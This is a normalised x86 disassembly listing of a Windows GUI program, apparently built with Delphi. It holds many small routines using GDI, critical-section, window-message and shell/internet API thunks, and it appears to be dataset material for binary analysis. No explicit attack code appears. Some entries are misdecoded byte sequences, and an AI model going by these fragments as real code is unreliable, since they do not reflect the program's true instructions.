mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xc
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423601
jmp sub_4046f8
sub_423608
pop ebx
pop ecx
pop ebp
retn
sub_423840
jmp sub_4046f8
sub_423868
jmp sub_4046f8
sub_42386f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4238dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1f
call sub_4050a8
pop esi
pop ebx
retn
sub_423950
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_4238ac
push eax
call MulDiv
neg eax
pop ebx
retn
sub_42398c
mov eax [ eax + 0x10 ]
movzx edx [ eax + 0x1d ]
mov eax edx
retn
sub_4239c4
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_4239f4
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1e ]
retn
sub_423a24
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_423b43
jmp sub_4046f8
sub_423b4a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423194
retn
sub_423b60
jmp sub_4046f8
sub_423bd5
jmp sub_4046f8
sub_423bdc
pop ebx
pop ecx
pop ebp
retn
sub_423be0
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_423c96
jmp sub_4046f8
sub_423ca8
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_404160
sub_423cbc
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_423cec
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_423dfb
jmp sub_4046f8
sub_423e02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423194
retn
sub_423e18
jmp sub_4046f8
sub_423e91
jmp sub_4046f8
sub_423e98
pop ebx
pop ecx
pop ebp
retn
sub_423fca
jmp sub_4046f8
sub_423fdc
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_4242e0
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_424440
jmp sub_4046f8
sub_424447
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_424450
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_424488
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424494
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4245e0
retn
sub_4246ad
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_4246c4
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_4247b0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4247d0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_4247f0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424810
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
pop ebx
retn
sub_424828
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
pop ebx
retn
sub_42484c
mov eax [ rw-data ]
call sub_424828
retn
sub_4248ae
jmp sub_4046f8
sub_4248b5
pop ecx
pop ebp
retn
sub_424954
jmp sub_4046f8
sub_42495b
pop ebx
mov esp ebp
pop ebp
retn
sub_424a2d
jmp sub_4046f8
sub_424abe
jmp sub_4046f8
sub_424ac5
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424bd8
jmp sub_4046f8
sub_424d85
jmp sub_4046f8
sub_424d8c
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_424fa5
jmp sub_4046f8
sub_424fac
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_425046
jmp sub_4046f8
sub_425223
jmp sub_4046f8
sub_4252dd
jmp sub_4046f8
sub_4252e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425304
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4252fd
jmp sub_4046f8
sub_425304
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_425495
jmp sub_4046f8
sub_425662
jmp sub_4046f8
sub_425669
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42568c
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402d44
retn
sub_425685
jmp sub_4046f8
sub_42568c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4256ac
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402d44
retn
sub_4256a5
jmp sub_4046f8
sub_4256ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4256b8
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_42581c
push 0x0
call sub_4257b4
retn
sub_4258c1
jmp sub_4046f8
sub_4258c8
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4258d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425824
pop ebx
pop ebp
retn 0x4
sub_4258ec
retn
sub_4258f0
test eax eax
jne r-xdata
retn
call sub_4258ec
sub_425ac5
jmp sub_4046f8
sub_425aec
jmp sub_4046f8
sub_425af3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425b34
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_425d0a
jmp sub_4046f8
sub_425d11
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
sub_425d27
jmp sub_4046f8
sub_425d3c
xor eax eax
retn
sub_425d40
movzx eax [ eax + 0x21 ]
retn
sub_425d90
jmp sub_4046f8
sub_425d97
pop esi
pop ecx
pop ebp
retn
sub_425dc8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_425e1f
jmp sub_4046f8
sub_425e26
pop esi
pop ecx
pop ebp
retn
sub_425e2c
retn
sub_425e4c
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_425e5c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_425fe1
jmp sub_4046f8
sub_425fe8
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_426107
jmp sub_4046f8
sub_42610e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_426196
jmp sub_4046f8
sub_42619d
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42623c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425f04
mov [ rw-data ] eax
sub_426324
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_4262c0
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_4263cc
jmp sub_404444
sub_4263ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_426324
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_426404
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_426324
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_4265a4
jmp sub_404444
sub_426622
jmp sub_4046f8
sub_426629
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42678c
retn
sub_42692c
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_426c30
jmp sub_4046f8
sub_426c37
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426daf
jmp sub_4046f8
sub_426db6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426e47
jmp sub_4046f8
sub_426e4e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e70
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404e68
retn
sub_426e69
jmp sub_4046f8
sub_426e70
pop ebx
mov esp ebp
pop ebp
retn
sub_426e85
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_42716c
jmp r-xdata
retn
sub_426e9b
call sub_4271f8
retn
sub_426f90
retn
sub_4271e8
jmp sub_4046f8
sub_427313
jmp sub_4046f8
sub_42731a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_427333
jmp sub_4046f8
sub_4275be
jmp sub_4046f8
sub_4275e6
jmp sub_4046f8
sub_4275ed
mov esp ebp
pop ebp
retn
sub_427664
jmp sub_4046f8
sub_42776c
jmp sub_4046f8
sub_427857
jmp sub_4046f8
sub_427864
inc [ eax + 0x4 ]
retn
sub_4279df
jmp sub_4046f8
sub_427d90
jmp sub_4046f8
sub_427fda
jmp sub_4046f8
sub_428004
jmp sub_4046f8
sub_42800b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42802d
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_428026
jmp sub_4046f8
sub_428037
jmp sub_404444
sub_428086
jmp sub_4046f8
sub_4282b3
jmp sub_4046f8
sub_4282fb
jmp sub_4046f8
sub_428472
jmp sub_4046f8
sub_42853c
jmp sub_404444
sub_428590
mov [ eax + 0x31 ] 0x0
call sub_425b34
retn
sub_4287e3
jmp sub_4046f8
sub_42884e
jmp sub_4046f8
sub_428855
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4288c4
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_428978
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_428988
push ebx
mov ebx eax
mov eax ebx
call sub_428c2c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_42899c
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4289b8
push ebx
mov ebx eax
mov eax ebx
call sub_428c8c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_428b00
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_428c0f
jmp sub_4046f8
sub_428e74
jmp sub_404444
sub_428ed4
jmp sub_4046f8
sub_428edb
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_4292bf
jmp sub_4046f8
sub_4292eb
jmp sub_4046f8
sub_429352
jmp sub_404444
sub_429383
jmp sub_4046f8
sub_429408
jmp sub_404444
sub_42940d
mov eax [ ebp - 0x38 ]
call sub_403f64
call sub_404800
call sub_404854
sub_42941f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42943c
mov eax [ ebp - 0x18 ]
call sub_402d44
retn
sub_429435
jmp sub_4046f8
sub_42958f
jmp sub_404444
sub_429824
jmp sub_404444
sub_4299ac
jmp sub_4046f8
sub_4299e4
mov cl 0x1
call sub_4299ec
retn
sub_429ca1
add [ eax ] al
add [ ebx ] dh
leave
call sub_4299ec
retn
sub_429d26
jmp sub_404444
sub_429d2b
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_404800
call sub_404854
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429de0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_429f1d
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_429f4c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_429f60
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42a079
jmp sub_404444
sub_42a12e
jmp sub_404444
sub_42a198
jmp sub_404444
sub_42a1cc
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42a158
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42a1e4
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424810
retn
mov [ eax + 0x30 ] edx
retn
sub_42a1fc
push ebx
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424810
pop ebx
retn
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
pop ebx
retn
sub_42a21c
retn
sub_42a220
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424810
retn
mov [ eax + 0x2c ] edx
retn
sub_42a260
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424810
pop ebp
retn 0x4
sub_42a274
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424810
pop ebp
retn 0x4
sub_42a3bf
jmp sub_4046f8
sub_42a407
jmp sub_4046f8
sub_42a40e
mov esp ebp
pop ebp
retn
sub_42a544
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42a550
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42a5fd
jmp sub_4046f8
sub_42a604
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a6ef
jmp sub_404444
sub_42a75d
jmp sub_4046f8
sub_42a891
jmp sub_4046f8
sub_42a898
pop ebp
retn
sub_42a96c
retn
sub_42a9e0
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42a9ec
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42a9f8
mov edx [ eax ]
call [ edx ]
retn
sub_42aa00
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42abbf
jmp sub_4046f8
sub_42abc6
pop ebp
retn
sub_42af7b
jmp sub_4046f8
sub_42af82
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42b39c
jmp sub_4046f8
sub_42b3a3
pop ebp
retn
InternetGetConnectedState
jmp [ InternetGetConnectedState@IAT ]
SHFileOperationA
jmp [ SHFileOperationA@IAT ]
SHGetSpecialFolderPathA
jmp [ SHGetSpecialFolderPathA@IAT ]
sub_42b470
mov al [ 0x2c0043b3 ]
retn
sub_42b476
inc edx
add [ ebx + esi * 4 - 0x3f5fffbd ] bl
inc ebx
add [ ecx + edx * 2 + 0x44 ] bh
add [ eax ] dh
retn
sub_42b52b
0x42
sub_42b52f
0x42
sub_42b68c
mov al [ 0x2c0043b3 ]
retn
sub_42bd58
pushad
retn 0x43
sub_42bd86
[ esi ]
sub_42c32c
cmp dl [ eax + 0x257 ]
je r-xdata
retn
mov [ eax + 0x257 ] dl
call sub_42c8f0
sub_42c340
push ebx
mov ebx eax
cmp dl [ ebx + 0x254 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x254 ] dl
mov eax ebx
call sub_42c8f0
mov eax ebx
call sub_4408ec
sub_42c364
cmp dl [ eax + 0x259 ]
je r-xdata
retn
mov [ eax + 0x259 ] dl
call sub_4408ec
sub_42c3a8
cmp dl [ eax + 0x25a ]
je r-xdata
retn
mov [ eax + 0x25a ] dl
call sub_4408ec
sub_42c540
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_443be8
push eax
call SetWindowTextA
pop ebx
retn
sub_42c55c
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_443be8
push eax
call SendMessageA
pop ebx
retn
sub_42c602
jmp sub_4046f8
sub_42c609
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c6a2
jmp sub_4046f8
sub_42c817
jmp sub_4046f8
sub_42c9d4
push ebx
mov ebx eax
mov eax ebx
call sub_43bd40
cmp [ ebx + 0x262 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_42cacc
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x25c ] 0x0
jne r-xdata
mov si 0xffb0
call sub_404160
sub_42cd8f
jmp sub_4046f8
sub_42cd96
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ce40
push esi
mov esi eax
mov eax [ esi + 0x18 ]
mov edx [ eax ]
call [ edx + 0xf0 ]
pop esi
retn
sub_42cea0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43c148
pop esi
pop ebx
retn
sub_42cf88
jmp sub_4046f8
sub_42cf8f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d224
movzx eax [ eax + 0x274 ]
retn
sub_42d22c
push ebx
mov ebx eax
mov eax ebx
call sub_43e848
xor edx edx
mov eax ebx
call sub_42c3f4
pop ebx
retn
sub_42d244
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_4408ec
sub_42d258
push esi
mov esi eax
mov eax [ esi + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42d268
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_4408ec
sub_42d27c
cmp dl [ eax + 0x276 ]
je r-xdata
retn
mov [ eax + 0x276 ] dl
call sub_4408ec
sub_42d2c4
call sub_442e40
retn
sub_42d321
jmp sub_4046f8
sub_42d328
pop ebp
retn
sub_42e07c
jmp sub_4046f8
sub_42e083
pop ebp
retn
sub_42e25e
jmp sub_404444
sub_42e317
jmp sub_4046f8
sub_42e31e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e324
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42e298
sub_42e334
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42e298
sub_42e344
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42e298
pop ebp
retn 0x8
sub_42e35c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42e395
jmp sub_4046f8
sub_42e39c
pop ebp
retn
sub_42e66e
jmp sub_404444
sub_42e673
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4589e0
call sub_404854
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e690
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42e698
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_404160
pop esi
retn
sub_42e6b0
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_404160
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42e6c8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42e74c
jmp sub_4046f8
sub_42e785
jmp sub_4046f8
sub_42e78c
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e798
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42e7ac
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_42ea0b
jmp sub_4046f8
sub_42ea12
pop ebp
retn
sub_42ea45
jmp sub_4046f8
sub_42ea4c
pop ebp
retn
sub_42ee85
jmp sub_4046f8
sub_42ee8c
pop ebp
retn
sub_42eef7
jmp [ edi ]
sub_42f1d8
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42f21c
push ebx
mov ebx eax
mov eax ebx
call sub_42f8f8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42f8e7
jmp sub_4046f8
sub_42f8f8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42b32c
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42f1ec
sub_42f959
jmp sub_4046f8
sub_42f960
pop ebp
retn
sub_4308d0
mov eax [ esp + 0x8 ]
retn
sub_4308d8
push ebx
mov ebx eax
call sub_4308d0
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
jmp sub_4047d8
sub_4308f4
pop ebx
retn
sub_430b63
jmp sub_4046f8
sub_430b6a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430d27
jmp sub_4046f8
sub_430d2e
movzx eax [ ebp - 0x6 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430d48
push ebx
mov eax [ rw-data ]
call sub_416d24
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_416cf8
mov eax ebx
pop ebx
retn
sub_430ed8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_430ef4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404114
movzx eax [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_4315e5
jmp sub_4046f8
sub_4315ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4316e2
jmp sub_4046f8
sub_4316e9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431b14
jmp sub_4046f8
sub_431b1b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_432010
jmp sub_4046f8
sub_4324c2
jmp sub_4046f8
sub_4324c9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432974
jmp sub_4046f8
sub_432e42
jmp sub_4046f8
sub_432e49
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433216
jmp sub_4046f8
sub_43321d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43322b
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4333dc
mov eax [ r-xdata ]
retn
sub_433418
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_43342c
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_43343c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_43344c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_43374c
mov edx eax
sub_4334e4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_404114
mov edx esi
call sub_433464
pop esi
pop ebx
retn
sub_433560
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_43374c
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_416824
mov ecx eax
sub_43393c
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_4339a4
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_433d54
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_433d88
sub_433d88
mov edx sub_433d60
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_430dcc
retn
sub_433f93
jmp sub_4046f8
sub_433f9a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434421
jmp sub_4046f8
sub_434458
jmp sub_4046f8
sub_43445f
movzx eax [ ebp - 0x26 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434600
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_43470c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_431264
retn
sub_434754
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_404160
pop esi
pop ebp
retn 0x8
sub_434770
mov eax [ eax + 0x34 ]
call sub_431898
retn
sub_43477c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_404160
pop esi
retn
sub_4347b8
push ebx
mov ecx sub_434790
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_430dcc
pop ebx
retn
sub_4349ec
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_434aec
jmp sub_4046f8
sub_434af3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434b10
mov eax [ ebp - 0xc ]
call sub_403f64
retn
sub_434b09
jmp sub_4046f8
sub_434b10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434b3a
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_434b33
jmp sub_4046f8
